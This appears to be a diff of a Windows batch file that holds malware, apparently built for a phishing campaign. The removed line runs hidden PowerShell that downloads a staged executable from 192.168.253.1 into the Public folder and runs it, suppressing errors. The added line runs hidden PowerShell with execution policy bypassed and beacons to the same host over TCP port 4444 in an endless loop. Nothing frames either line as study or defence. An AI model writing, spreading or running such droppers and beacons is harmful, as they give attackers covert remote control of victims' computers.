@@ -1,2 +1,2 @@
-@echo off
-powershell -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;$w=New-Object Net.WebClient;$w.Proxy=$null;try{$w.DownloadFile('http://192.168.253.1:4433/?h=192.168.253.1&p=4433&t=tcp&a=w64&stage=true','C:\Users\Public\f528764dtcp.exe');Start-Process 'C:\Users\Public\f528764dtcp.exe'}catch{}"
+@echo off
+powershell -WindowStyle Hidden -Exec Bypass -Command "$h="192.168.253.1";$pt=4444;$k="phish2026";while(1){try{$c=New-Object Net.Sockets.TcpClient($h,$pt);$s=$c.GetStream();$m=[Text.Encoding]::UTF8.GetBytes("__PING__");$s.Write($m,0,$m.Length);$s.Flush();Start-Sleep 5;$c.Close()}catch{};Start-Sleep 30}"
